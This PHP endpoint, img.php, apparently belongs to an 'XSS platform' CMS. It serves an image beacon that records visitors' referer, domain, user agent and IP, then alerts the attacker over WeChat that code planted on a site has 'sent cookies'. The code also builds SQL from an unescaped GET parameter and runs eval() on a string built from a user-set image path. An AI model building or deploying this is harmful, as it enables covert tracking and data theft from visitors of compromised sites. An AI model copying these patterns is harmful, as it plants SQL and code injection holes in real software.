<?php
/**
 * img.php 接口
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */

if(!defined('IN_OLDCMS')) die('Access Denied');

$id=Val('id','GET');
if($id){
	$db=DBConnect();
	$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE urlKey='{$id}'");
    

    //获取图片地址
    $moduleId=json_decode($project['modules']);
    $moduleSetKeys=json_decode($project['moduleSetKeys'],true);
    //$filename = './img/pic.jpg';
    //$filename = 'http://5.su.bdimg.com/icon/95492.png';//可为网络地址或者本地地址
    $filename=urldecode($moduleSetKeys["setkey_{$moduleId[0]}_img"]);
    
    if(!empty($project)) {//项目存在时获取客户端信息
        //服务器获取的content
        $serverContent=array();
        $serverContent['HTTP_REFERER']=$_SERVER['HTTP_REFERER'];
        $referers=@parse_url($serverContent['HTTP_REFERER']);
        $domain=$referers['host']?$referers['host']: '';
        $domain=StripStr($domain);
        $serverContent['HTTP_REFERER']=StripStr($_SERVER['HTTP_REFERER']);
        $serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
        $serverContent['REMOTE_ADDR']=StripStr($_SERVER['HTTP_X_FORWARDED_FOR']);
        $serverContent['IP_ADDRESS']=StripStr(get_ip_full(get_ip()));
		
        //referer单独放入内容中
        $content=array('referer'=> $serverContent['HTTP_REFERER']);
        
        /* cookie hash */
        $cookieHash=md5($project['id'].'_'.$serverContent['HTTP_REFERER']);
        $cookieExisted=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project[id]}' AND cookieHash='{$cookieHash}'");
        if(strlen($serverContent['HTTP_REFERER'])>0&& $cookieExisted<=0){//存在referer,且该项目中的referer不存在时才出入数据库中；referer存在时更新num数量，referer不存在时cookieHash会匹配不到，num不会增加
            $values=array(
                'projectId'=>$project['id'],
                'content'=>addslashes(JsonEncode($content)),
                'serverContent'=>addslashes(JsonEncode($serverContent)),
                'domain'=>$domain,
                'cookieHash'=>$cookieHash,
                'num'=>1,
                'addTime'=>time()
            );
            $db->AutoExecute(Tb('project_content'),$values);
            
            //发送微信
            $uid = $project['userId'];
			$userInfo = $db->FirstRow("SELECT wx FROM ".Tb('user')." WHERE id={$uid}");
			if($userInfo['wx'])
			{
				$content="您在{$domain}插入的代码给你送来cookie了，请登录平台查看。\r\n send by xss平台";
				send_wx($userInfo['wx'],$content);
			}
        }else{
            $db->Execute("UPDATE ".Tb('project_content')." SET num=num+1,updateTime='".time()."' WHERE projectId='{$project[id]}' AND cookieHash='{$cookieHash}'");
        }
    }

    //显示图片
    @$image = getimagesize($filename);
    if(empty($image)){
        $filename = './img/pic.jpg';
        $image = getimagesize($filename);
    }
    $mime = image_type_to_mime_type($image[2]);
    $fileType = substr(strstr($mime,'/'), 1);
    $img_out_string = "header('Content-type:image/$fileType');image$fileType(imagecreatefrom$fileType('$filename'));";
    eval($img_out_string);
}
?>